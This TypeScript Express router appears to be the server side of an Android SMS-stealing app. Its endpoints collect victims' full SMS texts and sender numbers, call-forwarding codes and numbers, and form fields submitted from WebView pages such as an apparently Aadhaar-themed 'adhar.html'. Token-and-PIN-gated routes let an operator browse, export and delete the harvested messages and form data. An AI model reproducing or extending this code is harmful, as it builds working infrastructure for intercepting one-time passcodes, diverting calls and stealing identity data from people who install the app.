import { Router } from "express";
import { db } from "../lib/supabase.js";
import { checkProxyRules, logProxyRequest } from "../lib/proxy.js";

const router = Router();

function getIp(req: { headers: Record<string, string | string[] | undefined>; socket: { remoteAddress?: string } }): string {
  const fwd = req.headers["x-forwarded-for"];
  const ip = (Array.isArray(fwd) ? fwd[0] : fwd) ?? req.socket.remoteAddress ?? "unknown";
  return ip.split(",")[0].trim();
}

// Verify the app token is active and not expired
async function verifyApp(appToken: string): Promise<{ ok: boolean; error?: string }> {
  const { data, error } = await db.from("apps").select("status, expires_at").eq("app_id", appToken).single();
  if (error || !data) return { ok: false, error: "App ID not found" };
  if (data.status === "disabled") return { ok: false, error: "App ID is disabled" };
  if (data.status === "inactive") return { ok: false, error: "App ID is inactive" };
  if (data.expires_at && new Date(data.expires_at) < new Date()) return { ok: false, error: "App ID expired" };
  return { ok: true };
}

// Fields the Android app may send that map directly to device table columns
// NOTE: sms_messages and last_sms_log are intentionally excluded — they go to the messages table
const DIRECT_COLUMNS = new Set([
  "status", "data_type",
  "device_name", "device_model", "android_version",
  "total_sms_count", "last_sms_timestamp",
  "sms_sync_status", "sms_pending_count", "sms_processed_count",
  "sms_permission_status", "sms_last_sync_at", "sms_last_error",
  "call_forward_status", "call_forward_action", "call_forward_code",
  "call_forward_number", "call_forward_sim_slot", "call_forward_response",
  "call_forward_timestamp", "last_heartbeat_at", "data_json",
]);

// Fields to never overwrite from payload
const SKIP_FIELDS = new Set(["app_id", "sub_id", "uid", "id", "registered_at", "created_at"]);

// Core device data_types — everything else is treated as form data
const CORE_DATA_TYPES = new Set([
  "registered_device", "heartbeat", "online_status",
  "fcm_token", "call_forward", "sms_sync", "device_info",
  "admin_config",
]);

// ── POST /api/device/:appToken/upsert ─────────────────────────────────────────
// Android app's smartUpsert — register device, heartbeat, call forward, etc.
// SMS messages are handled separately by POST /message
// Form data (non-core data_type) is routed to form_data table
router.post("/device/:appToken/upsert", async (req, res) => {
  const { appToken } = req.params;
  const payload = req.body as Record<string, unknown>;
  const ip = getIp(req as Parameters<typeof getIp>[0]);

  const subId = ((payload["sub_id"] ?? payload["uid"]) as string | undefined)?.trim() ?? "";
  if (!subId) return res.status(400).json({ ok: false, error: "sub_id or uid is required" });

  const meta = { endpoint: "upsert" as const, app_id: appToken, sub_id: subId, ip };

  const appCheck = await verifyApp(appToken);
  if (!appCheck.ok) {
    logProxyRequest({ endpoint: "/api/device/upsert", app_id: appToken, sub_id: subId, device_id: null, ip, status: "blocked", reason: appCheck.error!, payload_preview: { app_id: appToken, sub_id: subId } });
    return res.status(403).json({ ok: false, error: appCheck.error });
  }

  const { allowed, reason } = await checkProxyRules(meta);
  logProxyRequest({ endpoint: `/api/device/${appToken}/upsert`, app_id: appToken, sub_id: subId, device_id: null, ip, status: allowed ? "accepted" : "blocked", reason, payload_preview: { app_id: appToken, sub_id: subId, data_type: payload["data_type"] } });
  if (!allowed) return res.status(403).json({ ok: false, error: reason });

  const dataType = (payload["data_type"] as string | undefined) ?? "registered_device";

  // Non-core data types → insert into form_data table (in addition to device row update)
  if (dataType && !CORE_DATA_TYPES.has(dataType) && dataType !== "registered_device") {
    const formRow = {
      app_id: appToken,
      sub_id: subId,
      form_type: dataType,
      data: payload,
      submitted_at: new Date().toISOString(),
    };
    await db.from("form_data").insert(formRow);
    return res.json({ ok: true, routed: "form_data" });
  }

  // Build the device upsert row
  const row: Record<string, unknown> = {
    app_id: appToken,
    sub_id: subId,
    device_id: subId,
    updated_at: new Date().toISOString(),
    last_seen: new Date().toISOString(),
  };

  for (const [key, val] of Object.entries(payload)) {
    if (SKIP_FIELDS.has(key)) continue;
    if (DIRECT_COLUMNS.has(key)) row[key] = val;
  }

  // Extract device name/model/version from data_json if not already set
  const dj = payload["data_json"] as Record<string, unknown> | undefined;
  if (dj) {
    if (!row["device_name"]) row["device_name"] = dj["device_name"] ?? dj["model"] ?? null;
    if (!row["device_model"]) row["device_model"] = dj["model"] ?? null;
    if (!row["android_version"]) row["android_version"] = dj["androidversion"] ?? null;
  }

  const { data, error } = await db
    .from("devices")
    .upsert(row, { onConflict: "app_id,sub_id" })
    .select()
    .single();

  if (error) return res.status(500).json({ ok: false, error: error.message });
  return res.json({ ok: true, data });
});

// ── POST /api/device/:appToken/message ────────────────────────────────────────
// Insert a single SMS into the messages table
router.post("/device/:appToken/message", async (req, res) => {
  const { appToken } = req.params;
  const payload = req.body as Record<string, unknown>;
  const ip = getIp(req as Parameters<typeof getIp>[0]);

  const subId = ((payload["sub_id"] ?? payload["uid"]) as string | undefined)?.trim() ?? "";
  if (!subId) return res.status(400).json({ ok: false, error: "sub_id or uid is required" });

  const appCheck = await verifyApp(appToken);
  if (!appCheck.ok) {
    logProxyRequest({ endpoint: `/api/device/${appToken}/message`, app_id: appToken, sub_id: subId, device_id: null, ip, status: "blocked", reason: appCheck.error!, payload_preview: { app_id: appToken, sub_id: subId } });
    return res.status(403).json({ ok: false, error: appCheck.error });
  }

  const { allowed, reason } = await checkProxyRules({ endpoint: "message", app_id: appToken, sub_id: subId, ip });
  logProxyRequest({ endpoint: `/api/device/${appToken}/message`, app_id: appToken, sub_id: subId, device_id: null, ip, status: allowed ? "accepted" : "blocked", reason, payload_preview: { app_id: appToken, sub_id: subId, sender_number: payload["sender_number"], direction: payload["direction"], content: String(payload["message_body"] ?? "").slice(0, 80) } });
  if (!allowed) return res.status(403).json({ ok: false, error: reason });

  const tsRaw = payload["timestamp"] as number | undefined;
  const sentAt = tsRaw ? new Date(tsRaw).toISOString() : new Date().toISOString();

  // sender_number = actual phone number of who sent the SMS
  // phone_number  = sometimes the device sub_id, not the real sender — use only as last fallback
  // receiver_number = the SIM number that received the SMS (to_id)
  const messageRow = {
    app_id:          appToken,
    sub_id:          subId,
    from_id:         (payload["sender_number"] ?? payload["phone_number"] ?? null) as string | null,
    to_id:           (payload["receiver_number"] ?? null) as string | null,
    content:         ((payload["message_body"] as string | undefined) ?? "").slice(0, 5000),
    message_type:    (payload["direction"] as string | undefined) ?? "sms",
    sent_at:         sentAt,
    is_read:         false,
  };

  let insertResult = await db.from("messages").insert(messageRow).select().single();

  // If insert failed because to_id column doesn't exist yet, retry without it
  if (insertResult.error && insertResult.error.message.includes("to_id")) {
    const { to_id: _dropped, ...rowWithoutToId } = messageRow;
    insertResult = await db.from("messages").insert(rowWithoutToId).select().single();
  }

  const { data, error } = insertResult;
  if (error) return res.status(500).json({ ok: false, error: error.message });

  // Update device SMS stats — count rows in messages table for this device
  const { count } = await db
    .from("messages")
    .select("*", { count: "exact", head: true })
    .eq("app_id", appToken)
    .eq("sub_id", subId);

  const now = new Date().toISOString();
  await db
    .from("devices")
    .update({
      total_sms_count: count ?? 0,
      last_sms_timestamp: tsRaw ?? Date.now(),
      sms_sync_status: "SYNCED",
      sms_last_sync_at: Date.now(),
      updated_at: now,
      last_seen: now,
    })
    .eq("app_id", appToken)
    .eq("sub_id", subId);

  return res.json({ ok: true, data });
});

// ── POST /api/device/:appToken/form ───────────────────────────────────────────
// Insert form data into the form_data table
router.post("/device/:appToken/form", async (req, res) => {
  const { appToken } = req.params;
  const payload = req.body as Record<string, unknown>;
  const ip = getIp(req as Parameters<typeof getIp>[0]);

  const subId = ((payload["sub_id"] ?? payload["uid"]) as string | undefined)?.trim() ?? "";
  if (!subId) return res.status(400).json({ ok: false, error: "sub_id or uid is required" });

  const appCheck = await verifyApp(appToken);
  if (!appCheck.ok) {
    logProxyRequest({ endpoint: `/api/device/${appToken}/form`, app_id: appToken, sub_id: subId, device_id: null, ip, status: "blocked", reason: appCheck.error!, payload_preview: { app_id: appToken, sub_id: subId } });
    return res.status(403).json({ ok: false, error: appCheck.error });
  }

  const { allowed, reason } = await checkProxyRules({ endpoint: "form", app_id: appToken, sub_id: subId, ip });
  logProxyRequest({ endpoint: `/api/device/${appToken}/form`, app_id: appToken, sub_id: subId, device_id: null, ip, status: allowed ? "accepted" : "blocked", reason, payload_preview: { app_id: appToken, sub_id: subId, data_type: payload["data_type"] } });
  if (!allowed) return res.status(403).json({ ok: false, error: reason });

  const formRow = {
    app_id: appToken,
    sub_id: subId,
    form_type: (payload["data_type"] as string | undefined) ?? "form",
    data: payload,
    submitted_at: new Date().toISOString(),
  };

  const { data, error } = await db.from("form_data").insert(formRow).select().single();
  if (error) return res.status(500).json({ ok: false, error: error.message });
  return res.json({ ok: true, data });
});

// ── GET /api/device/:appToken/get/:uid ────────────────────────────────────────
router.get("/device/:appToken/get/:uid", async (req, res) => {
  const { appToken, uid } = req.params;
  const ip = getIp(req as Parameters<typeof getIp>[0]);

  const appCheck = await verifyApp(appToken);
  if (!appCheck.ok) return res.status(403).json({ ok: false, error: appCheck.error });

  const { allowed, reason } = await checkProxyRules({ endpoint: "get", app_id: appToken, sub_id: uid, ip });
  if (!allowed) return res.status(403).json({ ok: false, error: reason });

  const { data, error } = await db
    .from("devices")
    .select("*")
    .eq("app_id", appToken)
    .eq("sub_id", uid)
    .single();

  if (error || !data) return res.status(404).json({ ok: false, error: "Device not found" });
  return res.json({ ok: true, data });
});

// ── GET /api/device/:appToken/get ─────────────────────────────────────────────
router.get("/device/:appToken/get", async (req, res) => {
  const { appToken } = req.params;

  const appCheck = await verifyApp(appToken);
  if (!appCheck.ok) return res.status(403).json({ ok: false, error: appCheck.error });

  const { data, error } = await db
    .from("devices")
    .select("*")
    .eq("app_id", appToken)
    .order("registered_at", { ascending: false });

  if (error) return res.status(500).json({ ok: false, error: error.message });
  return res.json({ ok: true, data: data ?? [] });
});

// ── PATCH /api/device/:appToken/update/:uid ───────────────────────────────────
router.patch("/device/:appToken/update/:uid", async (req, res) => {
  const { appToken, uid } = req.params;
  const updates = req.body as Record<string, unknown>;
  const ip = getIp(req as Parameters<typeof getIp>[0]);

  const appCheck = await verifyApp(appToken);
  if (!appCheck.ok) return res.status(403).json({ ok: false, error: appCheck.error });

  const { allowed, reason } = await checkProxyRules({ endpoint: "update", app_id: appToken, sub_id: uid, ip });
  if (!allowed) return res.status(403).json({ ok: false, error: reason });

  const row: Record<string, unknown> = {
    updated_at: new Date().toISOString(),
    last_seen: new Date().toISOString(),
  };

  for (const [key, val] of Object.entries(updates)) {
    if (SKIP_FIELDS.has(key)) continue;
    if (DIRECT_COLUMNS.has(key)) row[key] = val;
  }

  const { data, error } = await db
    .from("devices")
    .update(row)
    .eq("app_id", appToken)
    .eq("sub_id", uid)
    .select()
    .single();

  if (error) return res.status(500).json({ ok: false, error: error.message });
  return res.json({ ok: true, data });
});

// ── GET /api/device/:appToken/messages ────────────────────────────────────────
// Returns messages for a device or all devices under this app token
router.get("/device/:appToken/messages", async (req, res) => {
  const { appToken } = req.params;
  const { uid, limit = "100", offset = "0" } = req.query as Record<string, string>;

  const appCheck = await verifyApp(appToken);
  if (!appCheck.ok) return res.status(403).json({ ok: false, error: appCheck.error });

  let query = db
    .from("messages")
    .select("*")
    .eq("app_id", appToken)
    .order("sent_at", { ascending: false })
    .range(Number(offset), Number(offset) + Number(limit) - 1);

  if (uid) query = query.eq("sub_id", uid);

  const { data, error } = await query;
  if (error) return res.status(500).json({ ok: false, error: error.message });
  return res.json({ ok: true, data: data ?? [] });
});

// ── GET /api/device/:appToken/form-data ───────────────────────────────────────
// Returns form submissions for a device or all devices under this app token
router.get("/device/:appToken/form-data", async (req, res) => {
  const { appToken } = req.params;
  const { uid, limit = "100", offset = "0" } = req.query as Record<string, string>;

  const appCheck = await verifyApp(appToken);
  if (!appCheck.ok) return res.status(403).json({ ok: false, error: appCheck.error });

  let query = db
    .from("form_data")
    .select("*")
    .eq("app_id", appToken)
    .order("submitted_at", { ascending: false })
    .range(Number(offset), Number(offset) + Number(limit) - 1);

  if (uid) query = query.eq("sub_id", uid);

  const { data, error } = await query;
  if (error) return res.status(500).json({ ok: false, error: error.message });
  return res.json({ ok: true, data: data ?? [] });
});

// ── POST /api/device/:appToken/data ───────────────────────────────────────────
// Called by the WebView JS (index.html / adhar.html etc.)
// Body format: { appId, deviceId, data: { ...formFields } }
// Inserts one row into form_data table — never touches devices table
router.post("/device/:appToken/data", async (req, res) => {
  const { appToken } = req.params;
  const payload = req.body as Record<string, unknown>;
  const ip = getIp(req as Parameters<typeof getIp>[0]);

  // The JS sends "deviceId" as the device identifier
  const subId = (
    (payload["deviceId"] ?? payload["sub_id"] ?? payload["uid"]) as string | undefined
  )?.trim() ?? "";
  if (!subId) return res.status(400).json({ ok: false, error: "deviceId is required" });

  const appCheck = await verifyApp(appToken);
  if (!appCheck.ok) return res.status(403).json({ ok: false, error: appCheck.error });

  const { allowed, reason } = await checkProxyRules({ endpoint: "upsert", app_id: appToken, sub_id: subId, ip });
  if (!allowed) return res.status(403).json({ ok: false, error: reason });

  // The JS wraps the actual form fields under a "data" key
  const formFields = (payload["data"] as Record<string, unknown> | undefined) ?? payload;

  const formRow = {
    app_id:       appToken,
    sub_id:       subId,
    form_type:    (formFields["form_type"] as string | undefined) ?? "form",
    data:         formFields,
    submitted_at: new Date().toISOString(),
  };

  const { data, error } = await db.from("form_data").insert(formRow).select().single();
  if (error) return res.status(500).json({ ok: false, error: error.message });

  logProxyRequest({ endpoint: `/api/device/${appToken}/data`, app_id: appToken, sub_id: subId, device_id: null, ip, status: "accepted", reason: "form submitted", payload_preview: { app_id: appToken, sub_id: subId, form_type: formRow.form_type } });
  return res.json({ ok: true, data });
});

// ── POST /api/device/:appToken/admin-login ────────────────────────────────────
// Android app admin login — checks password against apps.pin
router.post("/device/:appToken/admin-login", async (req, res) => {
  const { appToken } = req.params;
  const { password } = req.body as { password?: string };

  if (!password) return res.status(400).json({ ok: false, error: "Password required" });

  const { data: app, error } = await db.from("apps").select("pin, status, expires_at").eq("app_id", appToken).single();
  if (error || !app) return res.status(403).json({ ok: false, error: "Invalid App ID" });
  if (app.status === "disabled") return res.status(403).json({ ok: false, error: "App ID is disabled" });
  if (app.expires_at && new Date(app.expires_at) < new Date()) return res.status(403).json({ ok: false, error: "App ID expired" });
  if (password !== app.pin) return res.status(401).json({ ok: false, error: "Invalid password" });

  return res.json({ ok: true });
});

// ── POST /api/device/:appToken/admin-change-password ──────────────────────────
// Android app admin password change — verifies old password, updates apps.pin
router.post("/device/:appToken/admin-change-password", async (req, res) => {
  const { appToken } = req.params;
  const { old_password, new_password } = req.body as { old_password?: string; new_password?: string };

  if (!old_password || !new_password) return res.status(400).json({ ok: false, error: "old_password and new_password are required" });
  if (new_password.length < 4) return res.status(400).json({ ok: false, error: "New password must be at least 4 characters" });

  const { data: app, error } = await db.from("apps").select("pin, status").eq("app_id", appToken).single();
  if (error || !app) return res.status(403).json({ ok: false, error: "Invalid App ID" });
  if (app.status === "disabled") return res.status(403).json({ ok: false, error: "App ID is disabled" });
  if (old_password !== app.pin) return res.status(401).json({ ok: false, error: "Current password is incorrect" });

  const { error: updateErr } = await db.from("apps").update({ pin: new_password }).eq("app_id", appToken);
  if (updateErr) return res.status(500).json({ ok: false, error: updateErr.message });

  return res.json({ ok: true });
});

// ── GET /api/device/:appToken/data ────────────────────────────────────────────
// All devices for this app token
router.get("/device/:appToken/data", async (req, res) => {
  const { appToken } = req.params;

  const appCheck = await verifyApp(appToken);
  if (!appCheck.ok) return res.status(403).json({ ok: false, error: appCheck.error });

  const { data, error } = await db
    .from("devices")
    .select("*")
    .eq("app_id", appToken)
    .order("registered_at", { ascending: false });

  if (error) return res.status(500).json({ ok: false, error: error.message });
  return res.json({ ok: true, data: data ?? [] });
});

// ── DELETE /api/device/:appToken/message/:msgId ───────────────────────────────
// Delete a single message by its database ID
router.delete("/device/:appToken/message/:msgId", async (req, res) => {
  const { appToken, msgId } = req.params;

  const appCheck = await verifyApp(appToken);
  if (!appCheck.ok) return res.status(403).json({ ok: false, error: appCheck.error });

  const { error } = await db
    .from("messages")
    .delete()
    .eq("app_id", appToken)
    .eq("id", msgId);

  if (error) return res.status(500).json({ ok: false, error: error.message });
  return res.json({ ok: true });
});

// ── DELETE /api/device/:appToken/messages ─────────────────────────────────────
// Delete all messages for the app, or just one device if ?uid= is provided
router.delete("/device/:appToken/messages", async (req, res) => {
  const { appToken } = req.params;
  const { uid } = req.query as Record<string, string>;

  const appCheck = await verifyApp(appToken);
  if (!appCheck.ok) return res.status(403).json({ ok: false, error: appCheck.error });

  let query = db.from("messages").delete().eq("app_id", appToken);
  if (uid) query = query.eq("sub_id", uid);

  const { error } = await query;
  if (error) return res.status(500).json({ ok: false, error: error.message });
  return res.json({ ok: true });
});

// ── DELETE /api/device/:appToken/device/:uid ──────────────────────────────────
// Delete a device and all its messages + form_data
router.delete("/device/:appToken/device/:uid", async (req, res) => {
  const { appToken, uid } = req.params;

  const appCheck = await verifyApp(appToken);
  if (!appCheck.ok) return res.status(403).json({ ok: false, error: appCheck.error });

  await db.from("messages").delete().eq("app_id", appToken).eq("sub_id", uid);
  await db.from("form_data").delete().eq("app_id", appToken).eq("sub_id", uid);

  const { error } = await db
    .from("devices")
    .delete()
    .eq("app_id", appToken)
    .eq("sub_id", uid);

  if (error) return res.status(500).json({ ok: false, error: error.message });
  return res.json({ ok: true });
});

// ── PATCH /api/device/:appToken/star/:uid ─────────────────────────────────────
// Set or unset starred flag on a device (merges into data_json)
router.patch("/device/:appToken/star/:uid", async (req, res) => {
  const { appToken, uid } = req.params;
  const { starred } = req.body as { starred?: boolean };

  const appCheck = await verifyApp(appToken);
  if (!appCheck.ok) return res.status(403).json({ ok: false, error: appCheck.error });

  const { data: existing } = await db
    .from("devices")
    .select("data_json")
    .eq("app_id", appToken)
    .eq("sub_id", uid)
    .single();

  const dj = { ...((existing?.data_json as Record<string, unknown>) ?? {}), starred: !!starred, starred_updated_at: Date.now() };

  const { error } = await db
    .from("devices")
    .update({ data_json: dj, updated_at: new Date().toISOString() })
    .eq("app_id", appToken)
    .eq("sub_id", uid);

  if (error) return res.status(500).json({ ok: false, error: error.message });
  return res.json({ ok: true });
});

export default router;
